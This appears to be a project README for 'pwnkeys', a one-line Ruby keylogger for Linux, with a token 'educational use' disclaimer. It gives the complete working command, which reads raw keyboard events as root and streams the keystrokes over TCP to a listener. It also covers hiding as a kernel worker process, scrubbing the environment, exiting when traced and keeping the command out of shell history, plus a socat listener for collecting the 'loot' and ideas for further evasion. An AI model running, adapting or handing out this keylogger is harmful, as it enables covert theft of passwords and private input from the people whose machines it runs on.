
# ⌨️ pwnkeys: Keyboard Telemetry Exfiltrator

Just a one-liner Ruby command for capturing and exfiltrating keystroke telemetry from Linux systems while employing advanced anti-forensic and anti-debugging techniques.

⚠️ **Please Note:** This project is strictly for **Educational and Authorized Penetration Testing**. I am not responsible for any of the shenanigans you guys pull.

---

## 🚀 The Command

```bash
 sudo -v && (sudo nohup ruby -e 'require "socket"; $0="[kworker/u2:1]"; ENV.clear; ARGV.clear; k={1=>"[ESC]",2=>"1",3=>"2",4=>"3",5=>"4",6=>"5",7=>"6",8=>"7",9=>"8",10=>"9",11=>"0",12=>"-",13=>"=",14=>"[BKSP]",15=>"[TAB]",26=>"[",27=>"]",28=>"\n",29=>"[CTRL]",39=>";",40=>"\"",41=>"`",42=>"[SHFT]",43=>"\\",51=>",",52=>".",53=>"/",54=>"[SHFT]",55=>"*",56=>"[ALT]",57=>" ",58=>"[CAPS]",59=>"[F1]",60=>"[F2]",61=>"[F3]",62=>"[F4]",63=>"[F5]",64=>"[F6]",65=>"[F7]",66=>"[F8]",67=>"[F9]",68=>"[F10]",69=>"[NUM]",70=>"[SCROLL]",71=>"7",72=>"8",73=>"9",74=>"-",75=>"4",76=>"5",77=>"6",78=>"+",79=>"1",80=>"2",81=>"3",82=>"0",83=>".",87=>"[F11]",88=>"[F12]",96=>"[KP_ENT]",97=>"[R_CTRL]",98=>"/",99=>"[PRTSCR]",100=>"[R_ALT]",102=>"[HOME]",103=>"[UP]",104=>"[PGUP]",105=>"[LEFT]",106=>"[RIGHT]",107=>"[END]",108=>"[DOWN]",109=>"[PGDN]",110=>"[INS]",111=>"[DEL]",125=>"[WIN]"}; "16q17w18e19r20t21y22u23i24o25p30a31s32d33f34g35h36j37k38l44z45x46c47v48b49n50m".scan(/(\d+)(\w)/){|i,c| k[i.to_i]=c}; loop do begin; exit if File.read("/proc/self/status") =~ /TracerPid:\s+[1-9]/; dev_info = File.read("/proc/bus/input/devices"); dev = dev_info.split("\n\n").find { |d| d =~ /EV=120013/ }&.match(/event\d+/)&.to_s || "event0"; s=TCPSocket.new("127.0.0.1", 4444); f=File.open("/dev/input/#{dev}", "rb"); buf=""; while(b=f.read(24)) do e=b.unpack("Q!Q!SSi"); if e[2]==1 && e[4]==1; v=k[e[3]] || "[#{e[3]}]"; buf << v; if e[3]==28 || e[3]==96 || buf.length > 40; sleep(rand(0.1..0.4)); s.write(buf); s.flush; buf=""; end; end; end; rescue => e; sleep 15; retry; end; end' >/dev/null 2>&1 &)
```
Notice the space before the start of the payload? Include it to avoid the command from reflecting in `history`. 

---

## 🛠️  Workflow

### 📡 Attacker
Set up a persistent socket to receive incoming data.
*   **Utility**: Use `socat` to create a multi-threaded listener.
*   **Command**: `socat -u TCP4-LISTEN:4444,reuseaddr,fork OPEN:/tmp/.loot_log,creat,append & disown`.
*   **Live Feed**: `tail -f /tmp/.loot_log` to view captured real-time input.

### 💻 Victim
Once executed, the script operates as a ghost process.
*   **Discovery**: Silently crawls `/proc/bus/input/devices` to find the keyboard event handler without spawning sub-processes.
*   **Translation**: Decodes binary `input_event` structures into human-readable text.
*   **Stream**: Maintains an active socket connection to the listener, exfiltrating data in small randomized bursts.

---

## 🕵️ Stealth & Hardening

| Feature | Logic |
| :--- | :--- |
| **Process Cloaking** | Overwrites `$0` to masquerade as `[kworker/u2:1]`. A legitimate kernel worker. |
| **Env Scrubbing** | Wipes `ENV` and `ARGV` so forensic tools cannot see the original exec command. |
| **Anti-Debug** | Checks for a `TracerPid` constantly. If a debugger is attached, the script self-terminates. |
| **Jitter** | `sleep(rand(0.1..0.4))` to randomize packet timing and evade NIDS. |
| **Silent I/O** | Uses native Ruby file handlers instead of shell utilities to avoid triggering procmons. |

---

## 📊 MITRE

| ID | Technique | Tactic(s) |
| :--- | :--- | :--- |
| **T1056.001** | Input Capture (Keylogging) | Collection |
| **T1059.006** | Command and Scripting Interpreter (Ruby) | Execution |
| **T1134** | Access Token Manipulation | Defense Evasion |
| **T1027** | Obfuscated Files or Information | Defense Evasion |
| **T1548.003** | Abuse Elevation Control Mechanism (Sudo) | Defense Evasion |

---

## 🛑 Kill-Switch

*   **Self-Terminate**: Attaching a tracer or debugger to the process triggers an anti-debug exit.
*   **Manual Kill**: `sudo kill -9 $(pgrep -f kworker)`
*   **Note**: The script is made with a 15-second retry loop. It will attempt to reconnect even if the network or listener drops.

---

## 🔮 Wanna Polish Further?

- **TLS Encryption**: Adding SSL/TLS wrapping for the socket to prevent cleartext.
- **Domain Fronting**: Passing traffic through legitimate CDNs to mask the C2 IP address.
- **Kernel Hooking**: Moving from `/dev/input` monitoring to kernel-level hooks for deeper evasion.

---
